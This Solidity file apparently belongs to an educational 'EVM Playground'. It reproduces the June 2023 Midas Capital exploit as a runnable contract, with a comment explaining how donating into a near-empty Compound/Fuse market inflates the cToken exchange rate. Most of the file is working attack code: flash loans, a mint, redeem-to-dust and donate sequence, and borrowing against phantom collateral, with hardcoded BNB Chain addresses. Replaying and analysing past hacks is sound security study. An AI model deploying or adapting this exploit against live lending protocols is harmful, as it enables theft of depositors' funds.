// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-06-MidasCapitalXYZ).
// Faithful, no-import copy of `MidasXYZExploit` / `Borrower` / `Minter` from
// evm-hack-registry/2023-06-MidasCapitalXYZ_exp/test/MidasCapitalXYZ_exp.sol,
// with `testExploit()` renamed to `run()` (the recorded entrypoint). The two
// `deal(...)` cheatcode calls at the top of `testExploit()` (pre-funding this
// contract with 220,000 HAY + 23,000 BUSDT working capital) are NOT
// reproducible in the in-browser EVM (no cheatcodes) — they are replaced by
// `setup.dealToken` steps in the .mjs config (Foundry `deal` equivalent: a
// direct balance-mapping storage write), run unrecorded before `run()`.
// Everything else — the PancakeSwap V2 flash swap, the Algebra/Thena V3
// `flash`, the LP mint/redeem/donate exchange-rate manipulation, the
// `Borrower`/`Minter` helper contracts, and the flash-loan repayments — is
// copied verbatim.
//
// Root cause (Midas Capital, June 2023 — Compound/Fuse cToken exchange-rate
// inflation via donation into a near-empty market):
//
// A Compound/Fuse cToken prices each share as:
//     exchangeRate = (getCash() + totalBorrows - reserves) / totalSupply
// `getCash()` is simply `token.balanceOf(address(cToken))` — the market's
// raw underlying balance. The `fsAMM-HAY-BUSD` market's underlying is an
// ERC4626 vault wrapping a Thena LP token, and ERC4626 `deposit(assets,
// receiver)` lets ANY caller mint shares to ANY receiver. The attacker:
//   1. Mints ~105,924 fsAMM cTokens by depositing ~21,184.7 LP-vault shares.
//   2. Redeems all but 1,001 wei of those cTokens, pulling the 21,184.7
//      shares back out — leaving the market at totalSupply ~= 1,001 wei and
//      getCash ~= 0.
//   3. Donates the SAME 21,184.7 LP-vault shares straight back into the
//      cToken's balance by calling `vault.deposit(assets, receiver =
//      fsAMM_HAY_BUSD)` — crediting the cToken's getCash() WITHOUT minting
//      any new cTokens.
// That single donation makes exchangeRate = 21,184.7e18 / 1,001 ~= 2.116e37 —
// a 1,001-wei cToken position now looks like tens of thousands of dollars of
// collateral. The attacker seeds a second, honest fANKR collateral position
// from flash-loaned ANKR, enters both markets, and borrows out fankrBNB,
// fHAY, and (almost) all of fANKR against the combined (mostly phantom)
// collateral, repays both flash loans, and keeps the surplus ANKR + ankrBNB.
//
// The vulnerable code itself (`CToken.exchangeRateStoredInternal()` /
// `getCashPrior()`) lives in the cToken's Compound/Fuse delegate
// implementation contract, which is NOT independently verified on BscScan
// (only the thin `CErc20Delegator` proxy is a directly-touched account in the
// dumped fork state) — so it cannot be resolved to source by this pipeline's
// Etherscan-driven bytecode matcher and cannot anchor a "Go to vulnerability"
// locator. The vulnerability/story locators below instead anchor on the
// fully-controlled, verified exploit source itself, at the exact calls that
// perform the mint -> redeem-to-dust -> donate sequence, with the mechanism
// explained in the editorial text.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IWBNB {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface Uni_Pair_V2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function mint(address to) external returns (uint256 liquidity);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface Uni_Pair_V3 {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface ICErc20Delegate {
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address dst, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function getCash() external view returns (uint256);
    function totalBorrowsCurrent() external returns (uint256);
}

interface ICointroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cTokenAddress) external returns (uint256);
}

interface IHAY_BUSDT_Vault {
    function deposit(uint256 amount, address to) external returns (uint256);
}

interface IankrBNB_WBNB {
    function swap(
        address recipient,
        bool zeroToOne,
        int256 amountRequired,
        uint160 limitSqrtPrice,
        bytes memory data
    ) external returns (int256 amount0, int256 amount1);
}

contract MidasXYZExploit {
    IERC20 private constant ANKR = IERC20(0xf307910A4c7bbc79691fD374889b36d8531B08e3);
    IERC20 private constant ankrBNB = IERC20(0x52F24a5e03aee338Da5fd9Df68D2b6FAe1178827);
    IERC20 private constant HAY = IERC20(0x0782b6d8c4551B9760e74c0545a9bCD90bdc41E5);
    IERC20 private constant BUSDT = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IWBNB private constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Pair_V2 private constant ankrBNB_ANKRV2 = Uni_Pair_V2(0x8028AC1195B6469de22929C4f329f96B06d65F25);
    Uni_Pair_V3 private constant ankrBNB_ANKRV3 = Uni_Pair_V3(0xC8Cbf9b12552c0B85fc368AA530cc31E00526E2F);
    Uni_Pair_V2 private constant HAY_BUSDT = Uni_Pair_V2(0x93B32a8dfE10e9196403dd111974E325219aec24);
    ICErc20Delegate private constant fsAMM_HAY_BUSD =
        ICErc20Delegate(payable(0xF8527Dc5611B589CbB365aCACaac0d1DC70b25cB));
    Uni_Pair_V3 private constant WBNB_BUSDT = Uni_Pair_V3(0x85FAac652b707FDf6907EF726751087F9E0b6687);
    IHAY_BUSDT_Vault private constant HAY_BUSDT_Vault = IHAY_BUSDT_Vault(0x02706A482fc9f6B20238157B56763391a45bE60E);
    IankrBNB_WBNB private constant ankrBNB_WBNB = IankrBNB_WBNB(0x2F6C6e00E517944EE5EFE310cd0b98A3fC61Cb98);

    uint160 private constant sqrtPriceLimitX96 = 4_295_128_740;
    Borrower private borrower;

    // Renamed from testExploit(). The original also pre-funded `address(this)`
    // with 220,000 HAY + 23,000 BUSDT via `deal(...)` before this line; that
    // prep is replicated as `setup.dealToken` steps in the .mjs config (no
    // cheatcodes in the in-browser EVM), so `run()` starts directly with the
    // PancakeSwap V2 flash swap that kicks off the whole attack.
    function run() external {
        ankrBNB_ANKRV2.swap(0, ANKR.balanceOf(address(ankrBNB_ANKRV2)) - 1, address(this), bytes("_"));
    }

    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        borrower = new Borrower();
        ANKR.transfer(address(borrower), _amount1);
        uint256 flashAmount = ANKR.balanceOf(address(ankrBNB_ANKRV3));
        bytes memory data = abi.encode(flashAmount, _amount1);
        ankrBNB_ANKRV3.flash(address(borrower), 0, ANKR.balanceOf(address(ankrBNB_ANKRV3)), data);
    }

    function algebraFlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        (uint256 flashRepayAmountV3, uint256 flashRepayAmountV2) = abi.decode(data, (uint256, uint256));
        uint256 liquidityMinted = transferTokensAndMintLiqudity(20_000e18);
        HAY_BUSDT.approve(address(fsAMM_HAY_BUSD), type(uint256).max);
        fsAMM_HAY_BUSD.mint(liquidityMinted);
        fsAMM_HAY_BUSD.redeem(fsAMM_HAY_BUSD.balanceOf(address(this)) - 1001);
        HAY_BUSDT.approve(address(HAY_BUSDT_Vault), type(uint256).max);
        HAY_BUSDT_Vault.deposit(HAY_BUSDT.balanceOf(address(this)), address(fsAMM_HAY_BUSD));
        fsAMM_HAY_BUSD.transfer(address(borrower), 1001);
        borrower.execute();
        Minter minter = new Minter();
        ankrBNB.transfer(address(minter), 115e18);
        minter.mint();
        uint256 amountRequired = ankrBNB.balanceOf(address(this)) - 1e18;
        ankrBNB_WBNB.swap(
            address(this),
            true,
            int256(amountRequired),
            sqrtPriceLimitX96, // limitSqrtPrice
            bytes("")
        );

        WBNB_BUSDT.swap(address(this), true, int256(WBNB.balanceOf(address(this)) - 1e18), sqrtPriceLimitX96, bytes(""));
        liquidityMinted = transferTokensAndMintLiqudity(HAY.balanceOf(address(this)));
        HAY_BUSDT_Vault.deposit(liquidityMinted, address(fsAMM_HAY_BUSD));
        borrower.exit();
        ANKR.transfer(address(ankrBNB_ANKRV3), flashRepayAmountV3 + fee1);
        ANKR.transfer(address(ankrBNB_ANKRV2), (flashRepayAmountV2 * 10_026) / 10_000);
    }

    function algebraSwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        ankrBNB.transfer(msg.sender, uint256(amount0Delta));
    }

    function pancakeV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata _data) external {
        WBNB.transfer(msg.sender, uint256(amount0Delta));
    }

    function transferTokensAndMintLiqudity(
        uint256 amount
    ) private returns (uint256 liquidity) {
        (uint112 reserveHAY, uint112 reserveBUSDT,) = HAY_BUSDT.getReserves();
        uint256 transferAmountBUSDT = (amount * reserveBUSDT) / reserveHAY;
        HAY.transfer(address(HAY_BUSDT), amount);
        BUSDT.transfer(address(HAY_BUSDT), transferAmountBUSDT);
        return HAY_BUSDT.mint(address(this));
    }
}

contract Borrower {
    IERC20 private constant ANKR = IERC20(0xf307910A4c7bbc79691fD374889b36d8531B08e3);
    ICErc20Delegate private constant fANKR = ICErc20Delegate(payable(0x13aE975c5A1198e4F47c68C31C1230694DC44A57));
    ICErc20Delegate private constant fankrBNB = ICErc20Delegate(payable(0xb2b01D6f953A28ba6C8f9E22986f5bDDb7653aEa));
    ICErc20Delegate private constant fHAY = ICErc20Delegate(payable(0x10b6f851225c203eE74c369cE876BEB56379FCa3));
    ICErc20Delegate private constant fsAMM_HAY_BUSD =
        ICErc20Delegate(payable(0xF8527Dc5611B589CbB365aCACaac0d1DC70b25cB));
    ICointroller private constant Unitroller = ICointroller(0x1851e32F34565cb95754310b031C5a2Fc0a8a905);
    IERC20 private constant ankrBNB = IERC20(0x52F24a5e03aee338Da5fd9Df68D2b6FAe1178827);
    IERC20 private constant HAY = IERC20(0x0782b6d8c4551B9760e74c0545a9bCD90bdc41E5);

    function execute() external {
        ANKR.approve(address(fANKR), type(uint256).max);
        fANKR.mint(ANKR.balanceOf(address(this)));

        address[] memory fTokens = new address[](2);
        fTokens[0] = address(fANKR);
        fTokens[1] = address(fsAMM_HAY_BUSD);
        Unitroller.enterMarkets(fTokens);
        uint256 borrowAmount = fankrBNB.getCash();
        fankrBNB.borrow(borrowAmount);
        borrowAmount = fHAY.borrow(borrowAmount);
        ankrBNB.transfer(msg.sender, ankrBNB.balanceOf(address(this)));
        HAY.transfer(msg.sender, HAY.balanceOf(address(this)));
        ANKR.transfer(msg.sender, ANKR.balanceOf(address(this)));
    }

    function exit() external {
        fsAMM_HAY_BUSD.transfer(msg.sender, 1);
        uint256 borrowAmount = fankrBNB.getCash();
        fankrBNB.borrow(borrowAmount);
        Unitroller.exitMarket(address(fANKR));
        borrowAmount = (686_000e18 - fANKR.totalBorrowsCurrent()) - 1;
        fANKR.borrow(borrowAmount);
        fANKR.redeem(fANKR.balanceOf(address(this)));
        ankrBNB.transfer(msg.sender, ankrBNB.balanceOf(address(this)));
        ANKR.transfer(msg.sender, ANKR.balanceOf(address(this)));
    }
}

contract Minter {
    IERC20 private constant ankrBNB = IERC20(0x52F24a5e03aee338Da5fd9Df68D2b6FAe1178827);
    ICErc20Delegate private constant fankrBNB = ICErc20Delegate(payable(0xb2b01D6f953A28ba6C8f9E22986f5bDDb7653aEa));

    function mint() external {
        ankrBNB.approve(address(fankrBNB), type(uint256).max);
        fankrBNB.mint(ankrBNB.balanceOf(address(this)));
    }
}
